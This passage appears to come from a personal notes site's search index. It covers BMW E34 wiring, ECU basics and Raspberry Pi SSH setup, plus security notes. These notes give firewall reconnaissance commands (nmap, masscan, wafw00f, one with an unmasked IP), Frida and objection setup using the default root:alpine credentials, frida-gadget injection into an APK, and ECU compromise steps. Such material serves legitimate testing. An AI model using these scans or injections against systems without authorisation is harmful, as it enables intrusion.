out, left   R54 lights out, right    AC generator   51 DC at rectifiers   51e as 51, with choke coil   59 AC out, rectifier in, light switch   59a charge, rotor out   64 generator control light    Generator, voltage regulator   61 charge indicator (charge control light)   B+ battery +   B- battery -   D+ dynamo/alternator diode+   D- dynamo/alternator diode-   DF dynamo field   DF1 dynamo field 1   DF2 dynamo field 2   U, V, W AC three phase terminals    Lights   54 brake lights   54g lights   55 fog light   56 spot light   56a headlamp high beam and indicator light   56b low beam   56d signal flash   57 parking lights   57a parking lights   57L parking lights left   57R parking lights right   58 licence plate lights, instrument panel   58d panel light dimmer   58L parking light   58R parking light    Window wiper/washer   53 wiper motor + in   53a limit stop +   53b limit stop field   53c washer pump   53e stop field   53i wiper motor with permanent magnet, third brush for high speed    Acoustic warning   71 beeper in   71a beeper out, low   71b beeper out, high   72 hazard lights switch   85c hazard sound on    Switches   81 opener   81a 1 out   81b 2 out   82 lock in   82a 1st out   82b 2nd out   82z 1st in   82y 2nd in   83 multi position switch, in   83a out position 1   83b out position 2    Relay   85 relay coil -   86 relay coil +    Relay contacts   87 common contact   87a normally closed contact   87b normally open contact   88 common contact 2   88a normally closed contact 2   88b normally open contact 2    Additional   52 signal from trailer   54g magnetic valves for trailer brakes   75 radio, cigarette lighter   77 door valves control        ",url:"https://duraki.github.io/notes/din/"},"https:\/\/duraki.github.io\/notes\/e34-cluster-wiring-diagram\/":{title:"E34 Cluster Wiring Diagram",tags:[],content:"Hint: Use right-click, \u0026ldquo;Open Image in New Tab\u0026rdquo; - to see full resolution.\nE34 Low Cluster - EURO - MY. 88-90 Test Bench .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Wiring E34 Low Cluster, Euro, MY. \u0026lt; \u0026#39;90 - Test Bench  For this cluster, there are available pinouts for the sensors and signals.\nAdditionally, to trigger \u0026ldquo;Coolant Temperature Sensor\u0026rdquo;, put the Pin 4 of X16 to Ground.\nTo trigger \u0026ldquo;Fuel Level Warning Light\u0026rdquo;, make sure to put Pin 3 of X13060 to Ground. Along side, set Pin 14 (\u0026ldquo;Fuel Level Signal\u0026rdquo;) to Ground as well.\nE34 Low Cluster - EURO - MY. 88-90 Repair Matrix .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Testing, Repairing and Replacing Instrument Cluster (Matrix)  E34 Low Cluster - EURO - MY. 90-94 Board Diagnose Switch off the ignition, press and hold the distance kilometer reset button, then switch the ignition key to position 1, the button can now be released.\nThe result is shown:\n 01 BMW part no. 02 Code No. (coding plug) 03 K No. (tacho code) 04 last 7 digits of the FGSTNR 05 Software Version 06 Revision Index, Hardware No. 07 Cluster Test  ",url:"https://duraki.github.io/notes/e34-cluster-wiring-diagram/"},"https:\/\/duraki.github.io\/notes\/e34-misc-wiring\/":{title:"E34 Misc Wiring",tags:[],content:"Valuable Schema Diagrams  0670-0, represent the power distribution (fuse box in the engine compartment and equipment carrier at the rear) 0670-3, the details of the fuse 0670-4, the ground distributors of all consumers 0670-5, the diagnostic connection in the circuit diagrams of the various control units. The supply voltage, fuses, and ground connections are not listed in detail 7000, lists all connectors, if necessary with image references and specifications of the connector type 7100, installation location of various plugs and components in the form of images 8000, overview of the plug connections of the main cable harnesses 8500, list all plug connectors with regard to shape and number of poles  how-to schema readings: (Example)\n Q: How does the MF clock get the Ignition Switch signal (Terminal R)?  Circuit diagram for MF clock (6213-2/page 1) shows a plug X501 and goes to fuse F1 via Terminal R (Switching Plus). More at 0670.3 Connector X501 (7000/page 29) shows location of X501 (behind the center console), and pin 26, colored green. There is no picture of the position and the plug can be found on 8500/page 1, position 1. On page 0670.3/page 0, if you take a closer look, you will find the N10 module (MF clock) to which the violet-yellow cable you are looking for, i s connected to Pin 8. These colors were not listed in the circuit diagram of the MF clock. It can also be seen that this cable runs via connectors X1428 and X15, to X225, and from there to F1. The switching plus can also be recognized by the designation \u0026ldquo;R\u0026rdquo;, above the safety symbol. When looking further, at the X15 connector, for example, there is an image that shows that the connector is installed to the left of the instrument cluster (under the dashboard). Incidentally, this is where the harness connects across the dash to the rest of the vehicle. The combination insutrment is not attached to it, but the hazard warning lights, the cigarette lighter, the MF clock or the BC are available and the connection for the auxilary heating/ventilation (8-pin). above the glove component can also be seen. In this way, cable color, cable cross-section (the number next to the color), position (often even with picture) and connector type can be determined.    Tacho (RPM) Signal Testing the crankshaft sensor\nThe crankshaft sensor (RPM sensor) is mounted on the front face. The speed is measured via the \u0026ldquo;teeth\u0026rdquo; of the wheel. If the DME does not receive any signals, the engine will not start!\nTesting signals is easy as:\n Pulling out the plug Measure the resistance value between 1 and 2 with an ohmmeter:  M20/M30 : 540 Ohm +- 10% M50/M60 : 1280 Ohm +-10%    The distance sensor to \u0026ldquo;teeth\u0026rdquo;:\n 1.0 mm (+-0.3mm )  If the resistance value is not correct, then the sensor is defective and the motronic cannot evaluate it.\nSpeed Impulse/Signal With the E34, the speedometer signal is located in the radio connector, as well as dashboard cluster. There is detailed pinout for dashboard cluster. The BMW radio signals are described below, including details for wires.\nTesting the crankshaft sensor\nThe sensor is mounted on the right hand side of the throttle body, and cannot be adjusted. The motronic sends a voltage signal to the potentiometerm and measures the returned voltage. The voltage decreases as the throttle valve opens.\nTest #1 - Measure Voltage at connector:\n Pull off connector Ignition on Measure voltage at connector. Target value 5V(DC) (approx.)  Test #2 - Measure Ohm of pins:\n Pull out the plug Connect an ohmmeter Open the throttle valve and measure the values:  Pin 1 to Pin 3: approx. 4.0 KOhm Pin 1 to Pin 2: approx. 1.0 to 4.0 KOhm    Note: If you now slowly open the throttle valve, the value must change from 1.0 KOhm to 4.0 KOhm (stop to stop). If this is not the case, replace the potentiometer. Valve cannot be adjusted.\nCell Phone RJ45 Pinout  Remove the armest and roll-top box. Locate the RJ45 connector wire up a male RJ45 with the following config:  PIN 1 -\u0026gt; Constant +12V on car kit PIN 2 -\u0026gt; Switched +12V on car kit PIN 3 -\u0026gt; Ground on car kit PIN 4 -\u0026gt; Radio Mute on car kit PIN 5 -\u0026gt; Speaker + on car kit PIN 6 -\u0026gt; Speaker - on car kit PIN 7 -\u0026gt; Microphone + on car kit PIN 8 -\u0026gt; Microphone - on car kit\nConnect your male RJ45 to the connector in the console. On the left side of the trunk above the wheel well find the DB25 connector. Using a male DB25 make the following jumper connections:  PIN 1 -\u0026gt; PIN 5 (switched +12V) PIN 3 -\u0026gt; PIN 24 (Ground) PIN 4 -\u0026gt; PIN 6 (constant +12V) PIN 8 -\u0026gt; PIN 14 (MIC +) PIN 10 -\u0026gt; PIN 18 (Radio Mute) PIN 11 -\u0026gt; PIN 19 (Speaker -) PIN 12 -\u0026gt; PIN 25 (Speaker +) PIN 14 -\u0026gt; PIN 23 (MIC +)\nConnect your jumper to the DB25 in the trunk. If your car kit has an antenna output connect it to the antenna wire under the console, connect the two antenna wires together in the trunk, and connect your antenna to the wire in the headliner. If you have DSP you may need to apply +12V to the \u0026ldquo;cell phone present\u0026rdquo; signal on the DSP amp. My NAV site details the wiring for this, but I don\u0026rsquo;t have the DB25 PIN assignment for that at this time. If the wire isn\u0026rsquo;t obvious when you do the install then shoot me an email and I\u0026rsquo;ll tear into my connector and let you know.  That should just about do it. Your radio should mute when you are on the phone, and your car kit should use the factory audio. BTW the microphone is in the headliner next to the sunroof switch.\n Archived References Refer to AndrewP\u0026rsquo;s Phone Wiring.  BMW Radio Pinout Two types of the radio connector exists in BMW E34s:\n Connector on the Radio Multi-plugin Connector  They have different pinouts, as shown below:\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Pinouts for BMW E34 Radio (Connector, Multiplug)  The following table is valid for both versions:\n   Pin Connection More Info     1 Front Left Speaker +    2 Front Right Speaker +    3 Rear Left Speaker +    4 Phone Mute    5 Positive (+), Terminal R From Ignition Lock Stage 1, +12V   6 Rear Right Speaker +    7 NOT_USED    8 Front Left Speaker -    9 Permanent Positive (+), Terminal 30    10 Speedometer Signal For speed-dependent volume controle   11 Front Right Speaker -    12 Rear Left Speaker -    13 Lighting, Terminal 58g    14 Rear Right Speaker -    15 Ground, Terminal 31    16 Automatic Antenna, (HiFi) Amplifier Switching Output, +12V    You can wire BMW speakers with your custom CD-Player, based on the original wires colors (base color, and the stripe color).\nSpeakers wire connection is as the following:\n   Speaker  Left  Right      Front + Yellow Red Blue Red   Front - Yellow Brown Blue Brown   Rear + Yellow Violet Blue Violet   Rear - Yellow Gray Blue Gray   \u0026mdash;\u0026mdash;-  \u0026mdash;\u0026mdash;-  \u0026mdash;\u0026mdash;-     Note: for newer generation of BMW vehicles (ie. E38, E39, E46, E53), the assignment is the same, except:\n   Pin Connection More Info     7 I-Bus The newly introduced Information Bus     -     Archived References Refer to BMW Radiostecker (pdf) (ext) (archive) for wire color (extended table). For CD Changer, refer to this forum archive, as well as Becker TrafficPro \u0026lt;\u0026gt; BMW Pinout.  ",url:"https://duraki.github.io/notes/e34-misc-wiring/"},"https:\/\/duraki.github.io\/notes\/e34-pinout-diagram\/":{title:"E34 Pinout Diagram",tags:[],content:"Note: if you can\u0026rsquo;t make sense of the \u0026ldquo;Terminal #\u0026rdquo; keywords in the pinouts below, refer to Terminal Designations, and DIN 72552 pages. In short, it represents a standardised/defined/constant Pin I/O.\nE34 Radio Pinouts The BMW Series 5 E34 Radio Pinouts are located here.\nE34 Low Cluster - EURO - MY. 88-90 Pinouts Details:\nCluster: Low (without Check Control - aka CCM) Installed in: 518i M40 (import), 520i M20, 520i M50, 524td Period: until 09/1990 Manufacturer: Motometer Identification Features: - Mechanical km counter in the speedometer - Uneven scaling on the fuel gauge - White back of the instrument cluster - Coding plug (black) is in the back of the station wagon Defects and remedies: Replace the batteries on the circuit board (1.2V mignon). If these have leaked, they have usually already etched the circuit board - the only solution here is to replace them.  .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Pinouts for the particular model (X16/Yellow, X13060/Blue)  Download full pinout diagram, showing Connection, Signal Type, and Pin#NO (for High Cluster). Requires MacOS and Numbers.app. Otherwise, here you can download a compiled pdf version.\n Click for Pinouts Diagram    Pin Type Description     Pin 1 A TxD Diagnostic Line   Pin 2 E ABS Indicator Lamp   Pin 3 A Brake Fluid Level   Pin 4 E Coolant Temperature Sensor   Pin 5 A Oil Pressure Signal   Pin 6  NOT_USED   Pin 7 E Preheating, Diesel   Pin 8  SIA (Service Light) Reset   Pin 9  Charge Indicator Lamp, Terminal 61   Pin 10 E Start Clear Diesel   Pin 11  NOT_USED   Pin 12 E RxD Diagnosis Line   Pin 13 E NOT_USED   Pin 14 A Airbag Lamp Indicator   Pin 15 A Ignition Lock   Pin 16 A Fuse, Terminal 15, Ignition   Pin 17 A Terminal R for Airbag Indicator Lamp   Pin 18 A Ground Connection   Pin 19  NOT_USED   Pin 20 A TI (DME Control Unit) Signal   Pin 21 E Fuse, Terminal 30   Pin 22 E Fuse, Terminal R, Accessories Wire (ACC)   Pin 23 A Main Beam Indicator Lamp   Pin 24 A Turn Signal Indicator Lamp   Pin 25 A Fuse, Terminal 15, Ignition   Pin 26 E TD Signal     ",url:"https://duraki.github.io/notes/e34-pinout-diagram/"},"https:\/\/duraki.github.io\/notes\/e34-repair-restoration\/":{title:"E34 Repair \u0026 Restoration",tags:[],content:"Please, check Upgradables as well. These show my to-do, and wishlist that I planned for my E34.\nFixing and repairing Cigarette Lighter If the cigarette lighter no longer works, simply bend the two lugs at the rear-end of the socket sligthly inwards, with a plastic rod and it will work again.\nFixing Cluster and Interior Lights Requirement\n Two type of bulbs (both ending with orange wires)  T1 14V/40mA or 14V/60mA (3x6mm) T1 1/4 14V/80mA ~ equates to 1.2W    Use T1 14/40mA (or 14/60mA) for: lumbar switch, sport seat switch, old seat heating switch, rear blind switch, memory switch etc.\nUse T1 1/4 80mA for: sunroof switch, automatic program switch, rear window switch, light switch, NSW switch etc.\nUse E34Wiki Table List for all Bulbs that might need replacing.\nOpening doors with a dead battery Use the emergency unlock procedure; work every time with a dead battery.\n Turn passenger lock as to unlock the car, Keep it there, Pull the handle and turn key some more, Release the handle and turn more again, This will unlock your door.  ",url:"https://duraki.github.io/notes/e34-repair-restoration/"},"https:\/\/duraki.github.io\/notes\/ecu-calibration\/":{title:"ECU Calibration",tags:[],content:" ECU tuning is a part of Calibration Changing some values to make a vehicle faster, have better accelaration etc. This calibration process is used to fine tune all parameters before final manufacturing process Usually XCP interface is removed from final production If XCP is open, you still need to reverse the firmware to understand the ECU  How to Calibrate and Adjust  Calibration Software Vehicle networks Interface to the ECU Calibration Protocol ECU description file (*.a2l)  How does it work  CCP (CAN Calibration Protocol) XCP (Universal Calibration Protocol)  Tools CANape\n",url:"https://duraki.github.io/notes/ecu-calibration/"},"https:\/\/duraki.github.io\/notes\/ecu-foundations\/":{title:"ECU Foundations",tags:[],content:"ECU  Electronic Control Unit the \u0026ldquo;ECU\u0026rdquo; Doing calculations or apply rules in the vehicle system  Calculation example of ECU Meassure \u0026ldquo;Speed (km/h)\u0026rdquo; ECU would \u0026ldquo;calculate\u0026rdquo;: - speed (km/h) = wheel (rpm) x 3.6   Apply a tiny part of logic  If speed is above 5km/h, then lock the doors   ECUs are wired to sensors, mothers, and other actuators One ECU can be used for different vehicles They use microcontroller (have memory/storage unlike microprocessor) Uses embedded software, via special hardware that converts electrical signal to numbers (and vice-versa), collectively IO (input/output) Uses networking hardware, via in-vehicle networks (like CANBus)  ECU Software Layers\n Control functions that ECU runs are referred to as \u0026ldquo;application software\u0026rdquo;, (ie window control, etc.) (ASW) Network connections of IO of ECU are managed via \u0026ldquo;basic software\u0026rdquo; (like an operating system layer) (BSW) Runtime environment \u0026ldquo;RTE\u0026rdquo; glues both Network and Control functions, takes output from ASW to BSW To update ECU software, we can use UDS and Flash Bootloader a special piece of ECU that updates the firmware  Diagnostis  OBD protocol (On Board Diagnostics) Use OBD to diagnose ECU\u0026rsquo;s Use XCP and Callibration to Diagnose ECU  HCP (New era of ECU\u0026rsquo;s)  There is new generation of ECU called high-performance computing platform (HCP)  ",url:"https://duraki.github.io/notes/ecu-foundations/"},"https:\/\/duraki.github.io\/notes\/electronic-signals\/":{title:"Electronic Signals",tags:[],content:"Quick-jump to AC and DC Signals\nPurpose of Electronic Signals  Electronic Signals move information like cars move passenger down the highway Signals allow devices (e.g. sensors, or switches) to communicate with Control Modules  Such communication can be completed via simple Relays Other times, the communication requires a complicated processor   Signals and the modules perform or request (through more signaling) other functions to be carried out  Example of Signals\n A Signal can inform the Climate Control the outside air temperature. A Signal can inform the brake lights the right time to illuminate. A Signal can inform the DME to enable ABS due to rain.  The use of electronic signals goes far beyond the basic application of electron flow to some components. Electronic signals enables (or allow) complex information to be passed from one component to another.\nThe data (input or output) is exchanged through various forms such is changing voltages, resistance, current or frequency modulation.\nElectronic Signals are divided into two (2) main groups. There is AC Type Signals and DC Type Signals.\n",url:"https://duraki.github.io/notes/electronic-signals/"},"https:\/\/duraki.github.io\/notes\/enable-ssh-on-raspbian-os\/":{title:"Enable SSH on Raspbian OS",tags:[],content:"Via RO/RW SD Card This seems to work only on Raspbian OS, and not the custom GNU/Linux ARM builds-. To enable SSH on boot, you need to create a new ssh file in your SD Card\u0026rsquo;s /boot partition:\nFirst, make sure to mount the boot partition, as seen on Mounting SBC Operating System.\nNext, create the ssh file:\n$ sudo touch /Volumes/boot/ssh Paswordless SSH Authentication In your Raspberry OS, do the following to generate ~/.ssh defaults:\npi@raspberrypi:~ $ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/pi/.ssh/id_rsa): Created directory \u0026#39;/home/pi/.ssh\u0026#39;. ... +---[RSA 3072]----+ ...... +----[SHA256]-----+ Copy the Raspberry OS public key, and place it on your Host OS ~/.ssh/authorized_keys:\n# =\u0026gt; on RPi pi@raspberrypi:~ $ cat ~/.ssh/id_rsa.pub ssh-rsa AAAA.... # =\u0026gt; on Host OS galaxy@devil. ~ vim ~/.ssh/authorized_keys # .. paste the RPi id_rsa.pub .. galaxy@devil. ~ ssh-copy-id pi@raspberrypi.local /usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed ... pi@raspberrypi.local\u0026#39;s password: Number of key(s) added: 1 ... # =\u0026gt; now try logging into the machine, with $ ssh pi@raspberrypi.local You should be able to login without providing Raspberry Pi password.\n",url:"https://duraki.github.io/notes/enable-ssh-on-raspbian-os/"},"https:\/\/duraki.github.io\/notes\/ethernet-specifications\/":{title:"Ethernet Specifications",tags:[],content:"Specifications  SomeIP, Ethernet, IP Stack New standard 10BASE-T1S 10Mbit/s Half-duplex PLCA bus cycle - only specific PHY that can send data Physical Layer Collision Avoidance (PLCA) Avoid collision of data Multiple applications on single cable  ",url:"https://duraki.github.io/notes/ethernet-specifications/"},"https:\/\/duraki.github.io\/notes\/posts\/files\/":{title:"Files",tags:[],content:"",url:"https://duraki.github.io/notes/posts/files/"},"https:\/\/duraki.github.io\/notes\/firewall-engagements\/":{title:"Firewall Engagements",tags:[],content:"Reconned from the start to finish in a few sec \u0026hellip;\n┌──(kali㉿kali)-[~] └─$ ping x.x.x.x PING ??? 56(84) bytes of data. 64 bytes from ???: icmp_seq=1 ttl=52 time=64.4 ms 64 bytes from ???: icmp_seq=2 ttl=52 time=62.7 ms ^C --- ??? ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms ┌──(kali㉿kali)-[~] └─$ host x.x.x.x % nslookup \u0026gt; set type=PTR \u0026gt; x.x.x.x Server:	???	Address: ???	Non-authoritative answer: ... % whois x.x.x.x (example.ba) TCP Port Scan (Active)\n% sudo nmap -sS x.x.x.x PORT STATE SERVICE 8089/tcp open unknown UDP Port Scan\n% sudo nmap -sU --top-ports=100 x.x.x.x PORT STATE SERVICE 9/udp open|filtered discard 67/udp open|filtered dhcps Using masscan for rate allowance\n% sudo masscan 80.101.121.42 -p0-65535 --rate Scanning 1 hosts [65536 ports/host] Discovered open port 4433/tcp on x.x.x.x OS Detection\n% sudo nmap -O x.x.x.x Port Service detection\n% sudo nmap -sV -sS x.x.x.x -p $PORT PORT STATE SERVICE VERSION $PORT/tcp open http FRITZ!Box TR-069 service Enumerate HTTP Paths via nmap\n$ nmap -n -p80,4433,8080,8089,9443 --script http-enum x.x.x.x PORT STATE SERVICE 80/tcp closed http 4433/tcp open vop 8080/tcp closed http-proxy 8089/tcp open unknown 9443/tcp closed tungsten-https Certificate identification\n% nmap -sV --script ssl-cert-intaddr $SONICWALL -Pn -p4433,8089,80,9443,443 ... PORT STATE SERVICE VERSION 80/tcp filtered http 443/tcp filtered https 4433/tcp open ssl/http SonicWALL firewall http config |_http-server-header: SonicWALL | ssl-cert-intaddr: | Subject commonName: | 192.168.168.168 | Issuer commonName: |_ 192.168.168.168 8089/tcp open http FRITZ!Box TR-069 service 9443/tcp filtered tungsten-https Service Info: Devices: firewall, broadband router Active DNS Enumeration from the $ISP:\n% amass intel -active -addr x.x.x.x Firewalk Evasion\n% sudo nmap --script=firewalk --traceroute x.x.x.x ... PORT STATE SERVICE Host script results: | firewalk: | HOP HOST PROTOCOL BLOCKED PORTS TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 ... vhost discovery\n$ nmap -p4433,8089,80,9443 --script=\u0026#34;+http-vhosts\u0026#34; $SONICWALL -Pn PORT STATE SERVICE ... wafw00f implementation\n% wafw00f https://x.x.x.x:4433 -a -v ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\u0026#34; _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.1.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking https://??? [+] The site https://??? is behind SonicWall (Dell) WAF. Other Technqs\n Phineas\u0026rsquo; Phisher VPN exploit Manual SQL Injection via binary patch diffing of vuln/non-vuln version Bruteforce Attack (Rate Limiter, Bypass) VPN or Firewall Version Disclosure Known Exploits and CVE\u0026rsquo;s Potential SQLmap payload  ",url:"https://duraki.github.io/notes/firewall-engagements/"},"https:\/\/duraki.github.io\/notes\/frida-objection-tutorial\/":{title:"Frida \u0026 Objection Tutorial",tags:[],content:"Android Tutorial Frida Setup Make sure to have Android Debugging interface running (adbd) on your testing device. For reference, read the adbd setup first and then continue here.\nInstall the Frida for Android:\n$ adb root # might be required $ adb push frida-server /data/local/tmp/ $ adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; $ adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; Smoke test on Frida setup:\n$ adb devices -l $ frida-ps -U # PID NAME 1590 com.facebook.katana # 13194 com.facebook.katana:providers # 12326 com.facebook.orca # 13282 com.twitter.android ... adbd setup  Change all SELinux permissions to Permissable Use SELinuxPermission Android application, which checks for getenforce on a system reboot In MagiskManager application, enable the ADB Root When device is rebooting, USB debugging will not work out of the box SSH to Android device, using OpenSSHD In SSH shell type the following:  # =\u0026gt; On Android device (ssh) % su % whoami % adbd # =\u0026gt; On Attackers machine (duh) $ adb root $ adb shell (android) $ whoami # =\u0026gt; root iOS Tutorial Frida Setup  iOS connected over Wi-FI, Windows/Host connected to the same Wi-Fi, Linux/Guest connected to the same Wi-Fi Establish SSH connection to the iPhone (ssh root@x.x.x.x -p $PORT) SSH Auth combo (default): root:alpine Initiate a frida-server with remote connection listener In iOS device, open the application In a new Terminal, connect to Frida server  To create a new frida-server, first remove frida autoload script and start manually:\n# =\u0026gt; Unload iOS daemon $ launchctl unload -w /Library/LaunchDaemons/re.frida.server.plist # =\u0026gt; Start frida-server manually Testers-iPhone:/Applications root# frida-server -l x.x.x.x To establish a Frida REPL connection, use frida CLI:\nroot@kali:~# frida -H x.x.x.x -F ____ / _ | Frida 12.10.0 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://www.frida.re/docs/home/ [Remote::AppName]-\u0026gt; Objection Setup First reference to Frida Setup to establish connection to the Frida server. Then use objection to investigate into the targeted application.\nroot@kali:~# objection -N -h 172.22.4.109 -g App explore Using networked device @`172.22.4.109:27042` Agent injected and responds ok! _ _ _ _ ___| |_|_|___ ___| |_|_|___ ___ | . | . | | -_| _| _| | . | | |___|___| |___|___|_| |_|___|_|_| |___|(object)inject(ion) v1.9.4 Runtime Mobile Exploration by: @leonjza from @sensepost [tab] for command suggestions x.xxxx.xxxxxxxx.xxxx on (iPhone: 13.3) [net] # Objection Usage\n$ env x.xxx.xxxxxxxxx.xxxx on (iPhone: 13.3) [net] # env\nName Path ----------------- ------------------------------------------------------------------------------------------- BundlePath /private/var/containers/Bundle/Application/DD6C2A3C-6CD3-44D0-9EAF-BC8EEE8C6702/App.app CachesDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Library/Caches DocumentDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Documents LibraryDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Library  References\n Frida and Objection Objection Mobile Exploration Frida and Objection via x64.sh Objection/Frida Guide  ",url:"https://duraki.github.io/notes/frida-objection-tutorial/"},"https:\/\/duraki.github.io\/notes\/frida-gadget-injection\/":{title:"Frida Gadget Injection",tags:[],content:"This is quick description on how to inject Frida gadget into Smali directly without much overhead. Start by installing Frida and Objection and then continuing from here.\nFirst decompile the APK and check the AndroidManifest.xml file.\n$ more AndroidManifest.xml \u0026lt;application ...\u0026gt; \u0026lt;activity android:name=\u0026#34;xxx.activity.SplashActivity\u0026#34; android:noHistory=\u0026#34;true\u0026#34; android:screenOrientation=\u0026#34;portrait\u0026#34;\u0026gt; ... Write down the Activity name (such is SplashActivity). Must be somewhere on early start-up of application lifecycle. Open up the Activity in decompiled Smali object, and change the public constructor \u0026lt;init\u0026gt;(V) to include frida-gadget.\n$ vim xxx.activity.SplashActivity .class public Lcom/xxx/activity/SplashActivity; .source \u0026#34;SourceFile\u0026#34; # direct methods .method public constructor \u0026lt;init\u0026gt;()V .locals 0 .line 8 invoke-direct {p0}, Lcom/halcom/mobile/hybrid/activity/SplashActivity;-\u0026gt;\u0026lt;init\u0026gt;()V # =\u0026gt; injection point const-string v0, \u0026#34;frida-gadget\u0026#34; invoke-static {v0}, Ljava/lang/System;-\u0026gt;loadLibrary(Ljava/lang/String;)V return-void .end method Remember to inject this code in all of your public constructor \u0026lt;init\u0026gt;()V in Splash* activities. Move the application to your device and start it. Application has to handle libfrida-gadget.so correctly and load it at runtime. In Frida, it\u0026rsquo;s enought to type %resume in Frida REPL to continue execution after the injection.\n",url:"https://duraki.github.io/notes/frida-gadget-injection/"},"https:\/\/duraki.github.io\/notes\/ghidra-and-related\/":{title:"Ghidra and related",tags:[],content:"Installation Clone the repository or download and extract somewhere. In Ghidra, open the Script Manager (Window -\u0026gt; Script Manager) click the Script Directory button and add $REPO/scripts to the list.\nOnce the script directory is added to Ghidra you can find the scripts in the Script Manager. You can run the scripts directly from the Script Manager if you like but the scripts also have menus and keyboard shortcuts for ease of use. In order to activate the menus and shortcuts you must click the In Tool checkbox next to the scripts you wish to integrate into the tool.\nFavorite Plugins  coloring_call_jmp.py py-findcrypt-ghidra binwalk.py yara.py swift_demangler.py golang_renamer.py ghidra-fidb-repo replace-constants annotate-syscalls goto-main operator analyzeocmsgsend.py fox rhabdomancer.java  Additionally, there is ghidra-snippets repository that may be usable as a reference to various Ghidra functions and their signatures.\n",url:"https://duraki.github.io/notes/ghidra-and-related/"},"https:\/\/duraki.github.io\/notes\/gmmk-60-keyboard\/":{title:"GMMK 60% Keyboard",tags:[],content:"General Shortcuts, LED Shortcuts\nGeneral Shortcuts    Shortcut Function     Fn+W Adjust keyboard\u0026rsquo;s LED backlight brightness   Fn+S Adjust keyboard\u0026rsquo;s LED backlight brightness   Fn+Z Adjust LED backlight direction   Fn+X Cycle through various backlight RGB colors   Fn+A Adjust RGB LED light speed during animations   Fn+D Adjust RGB LED light speed during animations   Fn+R Press for 10 seconds to reset keyboard to factory default settings   Fn+Win Enable / Disable Windows key   Fn+Caps Lock Swap functions of Fn and Caps Lock. Press again to revert   Fn+Tab Turn off all LED lights on the keyboard   Fn+Esc `   Fn+1 F1   Fn+N F(n)   Fn+0 F9   Fn+- F11   Fn++ F12   Fn+Shift+Esc ~   Fn+O Page Down   Fn+U Page Up   Fn+P Print Screen   Fn+[ Scroll Lock   Fn+] Pause   Fn+J Left arrow   Fn+K Down arrow   Fn+L Right arrow   Fn+I Up arrow   Fn+; Insert   Fn+' Delete   Fn+N Home   Fn+M End   Fn+, Mute Volume   Fn+. Decrease Volume   Fn+/ Increase Volume    LED Shortcuts note you can use up to 3 variations per effect type\n   Shortcut Effect Type Effect Count     Fn+F Breath Effect x3   Fn+G Touch Effect x3   Fn+V K-Effect x3   Fn+C Wave #1 x3   Fn+B Wave #2 x3   Fn+H Drawing x3    ",url:"https://duraki.github.io/notes/gmmk-60-keyboard/"},"https:\/\/duraki.github.io\/notes\/hall-effect-sensors\/":{title:"Hall Effect Sensors",tags:[],content:"Hall Effect Sensors can be used to produce ON/OFF signals or modulated square wave. It\u0026rsquo;s a type of DC Digital Sensors in DC Signals.\nHall Effect Sensors are electronic switches, that react to magnetic fields, to rapidly control the flow of current or voltage ON and OFF. It is assembled of epoxy filled non-magnetic housing, containing a hall element, a magnet, and a trigger wheel.\nThe Hall element is a thin, non-magnetic plate which is electrically conductive. Electron flow is equal on both side of the plate.\nSince everything between the magnet and the hall element is non-magnetic, the magnet (or magnetic field) has no effect on the current flow.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Hall Sensor Disassembly  If a solid area or other trigger device approaches the sensor, a magnetic field is created between the magnet and the disk. This magnetic field cause the electron flow to stop on one side of the plate, and continue to flow on the other side.\n  The Hall Sensor Signal is a measurement of the voltage drop between the two sides of the plate. When the magnetic field increases, the voltage \u0026ldquo;drop\u0026rdquo; across the two sides of the plate increases. High voltage on one side, low voltage on the other. The signal output from the sensor is High.\n  As the disc moves away from the sensor, the magnetic field weakens and is lost. This loss produces very little voltage drop across the plate sides.The signal output is Low.\n  A rapid switching of the voltage ON/OFF produces a HIGH/LOW signal that the Control Module uses to recognize speed and position.\nTypical Application of Hall Effect Sensors  Crankshaft Sensors Camshaft Sensors Motor Position and Speed Sensors (e.g. Window Motor, Sunroof Motor) \u0026hellip;  ",url:"https://duraki.github.io/notes/hall-effect-sensors/"},"https:\/\/duraki.github.io\/notes\/how-to-compromise-ecu\/":{title:"How to compromise ECU",tags:[],content:"Five steps to compromise ECU:\n Remote access Access to in-vehicle network Bridge domain boundaries Access to target ECU Manipulate ECU or vehicle behavior  Find more info about Car Hacking on notes.\n",url:"https://duraki.github.io/notes/how-to-compromise-ecu/"},"https:\/\/duraki.github.io\/notes\/how-to-write-notes\/":{title:"How to write Notes",tags:[],content:"TL;DR  Use Markdown for everything Use shortcodes,  